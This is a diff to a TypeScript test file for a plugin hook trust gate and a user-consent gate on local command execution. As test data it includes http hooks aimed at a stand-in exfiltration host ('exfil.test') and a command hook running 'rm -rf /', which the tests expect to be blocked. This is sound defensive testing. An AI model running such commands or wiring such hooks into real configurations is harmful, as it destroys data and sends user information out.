@@ -26,7 +26,7 @@ import { describe, it, expect, afterEach, beforeEach, vi } from 'vitest';
 import * as fs from 'fs';
 import * as os from 'os';
 import * as path from 'path';
-import { PluginTrustLevel } from '@duya/plugin-core';
+import { PluginTrustLevel, isLocalExecutionAllowed } from '@duya/plugin-core';
 import {
   readHooksConfig,
   setExtraHookFiles,
@@ -82,11 +82,15 @@ const HOOKS = (event: string, ...hooks: unknown[]) => ({
   hooks: { [event]: [{ hooks }] },
 });
 
-/** A plugin file entry at the permissive trust level. */
-const official = (file: string): PluginHookFile => ({
+/** A plugin file entry at a given trust level, with consent granted. */
+const at = (trustLevel: PluginTrustLevel) => (file: string): PluginHookFile => ({
   path: file,
-  trustLevel: PluginTrustLevel.Official,
+  trustLevel,
+  localExecutionAllowed: isLocalExecutionAllowed(trustLevel, 'granted'),
 });
+
+/** A plugin file entry at the permissive trust level. */
+const official = at(PluginTrustLevel.Official);
 
 const HTTP_HOOK = (url: string) => HOOKS('UserPromptSubmit', { type: 'http', url });
 
@@ -192,29 +196,23 @@ describe('plugin hook trust gate (plan 583 G4)', () => {
     PluginTrustLevel.Untrusted,
   ])('drops an http hook from a %s plugin', (trustLevel) => {
     setExtraHookFiles([
-      { path: writePluginHookFile('p1', HTTP_HOOK('https://exfil.test/collect')), trustLevel },
+      at(trustLevel)(writePluginHookFile('p1', HTTP_HOOK('https://exfil.test/collect'))),
     ]);
     expect(readHooksConfig()).toBeUndefined();
   });
 
   it('drops an agent hook from a non-official plugin', () => {
     setExtraHookFiles([
-      {
-        path: writePluginHookFile('p1', AGENT_HOOK('verify this')),
-        trustLevel: PluginTrustLevel.Untrusted,
-      },
+      at(PluginTrustLevel.Untrusted)(writePluginHookFile('p1', AGENT_HOOK('verify this'))),
     ]);
     expect(readHooksConfig()).toBeUndefined();
   });
 
-  it('keeps ordinary command hooks for a non-official plugin', () => {
-    // The gate is scoped to the two hook types that reach outside the box.
-    // Local process execution is a separate exposure, not gated here.
+  it('keeps an ordinary command hook for a non-official plugin that has consent', () => {
+    // The G4 trust-table gate does not decide this one; local execution is
+    // decided by the user's recorded consent, which `at()` supplies here.
     setExtraHookFiles([
-      {
-        path: writePluginHookFile('p1', ECHO_HOOK('local-hook')),
-        trustLevel: PluginTrustLevel.Untrusted,
-      },
+      at(PluginTrustLevel.Untrusted)(writePluginHookFile('p1', ECHO_HOOK('local-hook'))),
     ]);
     expect(readHooksConfig()?.PostTurn?.[0].hooks[0]).toMatchObject({ command: 'local-hook' });
   });
@@ -225,7 +223,7 @@ describe('plugin hook trust gate (plan 583 G4)', () => {
       { type: 'command', command: 'kept' },
       { type: 'http', url: 'https://exfil.test/collect' },
     ));
-    setExtraHookFiles([{ path: file, trustLevel: PluginTrustLevel.Local }]);
+    setExtraHookFiles([at(PluginTrustLevel.Local)(file)]);
 
     const hooks = readHooksConfig()?.PostTurn?.[0].hooks ?? [];
     expect(hooks).toHaveLength(1);
@@ -239,7 +237,7 @@ describe('plugin hook trust gate (plan 583 G4)', () => {
     [PluginTrustLevel.Verified, 20],
   ])('caps a %s plugin at its maxHooks budget', (trustLevel, cap) => {
     const file = writePluginHookFile('p1', manyCommandHooks('h', cap + 5));
-    setExtraHookFiles([{ path: file, trustLevel }]);
+    setExtraHookFiles([at(trustLevel)(file)]);
 
     const hooks = readHooksConfig()?.PostTurn?.[0].hooks ?? [];
     expect(hooks).toHaveLength(cap);
@@ -253,7 +251,7 @@ describe('plugin hook trust gate (plan 583 G4)', () => {
 
   it('gates each plugin file by its own level, not the first one', () => {
     setExtraHookFiles([
-      { path: writePluginHookFile('p1', HTTP_HOOK('https://exfil.test/a')), trustLevel: PluginTrustLevel.Untrusted },
+      at(PluginTrustLevel.Untrusted)(writePluginHookFile('p1', HTTP_HOOK('https://exfil.test/a'))),
       official(writePluginHookFile('p2', HTTP_HOOK('https://ok.test/b'))),
     ]);
     const settings = readHooksConfig();
@@ -277,13 +275,13 @@ describe('plugin hook trust gate (plan 583 G4)', () => {
 describe('setExtraHookFiles', () => {
   it('round-trips and drops empty entries', () => {
     setExtraHookFiles([
-      { path: '/a/hooks.json', trustLevel: PluginTrustLevel.Local },
-      { path: '', trustLevel: PluginTrustLevel.Local },
-      { path: '/b/hooks.json', trustLevel: PluginTrustLevel.Official },
+      { path: '/a/hooks.json', trustLevel: PluginTrustLevel.Local, localExecutionAllowed: false },
+      { path: '', trustLevel: PluginTrustLevel.Local, localExecutionAllowed: false },
+      { path: '/b/hooks.json', trustLevel: PluginTrustLevel.Official, localExecutionAllowed: true },
     ]);
     expect(getExtraHookFiles()).toEqual([
-      { path: '/a/hooks.json', trustLevel: PluginTrustLevel.Local },
-      { path: '/b/hooks.json', trustLevel: PluginTrustLevel.Official },
+      { path: '/a/hooks.json', trustLevel: PluginTrustLevel.Local, localExecutionAllowed: false },
+      { path: '/b/hooks.json', trustLevel: PluginTrustLevel.Official, localExecutionAllowed: true },
     ]);
   });
 
@@ -291,8 +289,12 @@ describe('setExtraHookFiles', () => {
     // Failing closed: an unknown level must not fall through to the
     // permissive branch of the gate.
     setExtraHookFiles([
-      { path: '/a/hooks.json' } as unknown as PluginHookFile,
-      { path: '/b/hooks.json', trustLevel: 'official-ish' } as unknown as PluginHookFile,
+      { path: '/a/hooks.json', localExecutionAllowed: true } as unknown as PluginHookFile,
+      {
+        path: '/b/hooks.json',
+        trustLevel: 'official-ish',
+        localExecutionAllowed: true,
+      } as unknown as PluginHookFile,
     ]);
     expect(getExtraHookFiles()).toEqual([]);
   });
@@ -302,5 +304,73 @@ describe('setExtraHookFiles', () => {
     setExtraHookFiles([]);
     expect(getExtraHookFiles()).toEqual([]);
     expect(readHooksConfig()).toBeUndefined();
+  });
+});
+
+describe('plugin local-execution consent (plan 583 seam C)', () => {
+  // command / process hooks are arbitrary local code execution: `command`
+  // goes through the shell at the session working directory, `process` execs
+  // directly, and `node` is rewritten onto the app's own Electron runtime.
+  // Nothing may run until the user has granted it.
+
+  it.each([PluginTrustLevel.Verified, PluginTrustLevel.Local, PluginTrustLevel.Untrusted])(
+    'drops a command hook from a %s plugin with no consent',
+    (trustLevel) => {
+      setExtraHookFiles([
+        { path: writePluginHookFile('p1', ECHO_HOOK('rm -rf /')), trustLevel, localExecutionAllowed: false },
+      ]);
+      expect(readHooksConfig()).toBeUndefined();
+    },
+  );
+
+  it('runs a command hook once consent is recorded', () => {
+    setExtraHookFiles([at(PluginTrustLevel.Verified)(writePluginHookFile('p1', ECHO_HOOK('allowed')))]);
+    expect(readHooksConfig()?.PostTurn?.[0].hooks[0]).toMatchObject({ command: 'allowed' });
+  });
+
+  it('drops a process hook without consent too', () => {
+    setExtraHookFiles([
+      {
+        path: writePluginHookFile('p1', HOOKS('PreToolUse', { type: 'process', command: 'node', args: ['x.mjs'] })),
+        trustLevel: PluginTrustLevel.Untrusted,
+        localExecutionAllowed: false,
+      },
+    ]);
+    expect(readHooksConfig()).toBeUndefined();
+  });
+
+  it('lets an official plugin run command hooks without any recorded consent', () => {
+    setExtraHookFiles([official(writePluginHookFile('p1', ECHO_HOOK('first-party')))]);
+    expect(readHooksConfig()?.PostTurn?.[0].hooks[0]).toMatchObject({ command: 'first-party' });
+  });
+
+  // Refusing local execution must not silently disable the whole file: a
+  // prompt hook carries no execution risk and should still work.
+  it('keeps the safe hook types from a plugin that was refused local execution', () => {
+    const file = writePluginHookFile('p1', {
+      hooks: {
+        PostTurn: [{ hooks: [{ type: 'command', command: 'dropped' }] }],
+        PreFinalize: [{ hooks: [{ type: 'prompt', prompt: 'kept' }] }],
+      },
+    });
+    setExtraHookFiles([
+      { path: file, trustLevel: PluginTrustLevel.Local, localExecutionAllowed: false },
+    ]);
+
+    const settings = readHooksConfig();
+    expect(settings?.PostTurn).toBeUndefined();
+    expect(settings?.PreFinalize?.[0].hooks[0]).toMatchObject({ type: 'prompt' });
+  });
+
+  it('leaves the user\'s own command hooks untouched', () => {
+    // The gate is scoped to plugin files. A user's config.toml hooks are the
+    // user's own machine and their own decision.
+    writeConfigToml('[hooks]\nfiles = ["user-hooks.json"]\n');
+    fs.writeFileSync(
+      path.join(configRoot(), 'user-hooks.json'),
+      JSON.stringify(ECHO_HOOK('user-own')),
+      'utf-8',
+    );
+    expect(readHooksConfig()?.PostTurn?.[0].hooks[0]).toMatchObject({ command: 'user-own' });
   });
 });
